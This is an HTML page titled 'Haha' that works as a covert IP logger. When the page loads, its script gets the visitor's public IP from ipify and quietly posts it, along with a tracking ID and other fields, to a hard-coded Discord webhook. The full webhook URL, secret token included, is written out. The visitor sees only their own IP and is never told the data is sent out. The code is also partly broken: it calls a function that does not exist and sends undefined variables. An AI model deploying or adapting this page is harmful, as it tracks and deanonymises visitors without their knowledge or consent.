<!DOCTYPE html>
<html>
  <head>
    <title>Haha</title>
    <script>
      function displayIP() {
        fetch("https://api.ipify.org/?format=json")
          .then((response) => response.json())
          .then((data) => {
            const ipElement = document.getElementById("ip");
            ipElement.textContent = data.ip;
            getLocation(data.ip);

            const pageUserID = Date.now(); // Generate a unique pageUserID based on the current timestamp
            localStorage.setItem("pageUserID", pageUserID); // Store the pageUserID in localStorage
            sendToWebhook(data.ip, location, isp, time, pageUserID); // Send the pageUserID along with other data to the webhook
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }

      function sendToWebhook(ip, location, isp, time, pageUserID) {
        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
        const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time: " + time + ", Page User ID: " + pageUserID; // Include the pageUserID in the message
        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ content: message }),
        })
          .then((response) => {
            console.log("Success:", response);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }
    </script>
  </head>
  <body onload="displayIP()">
    <p>Your IP address is: <span id="ip"></span></p>
  </body>
</html>
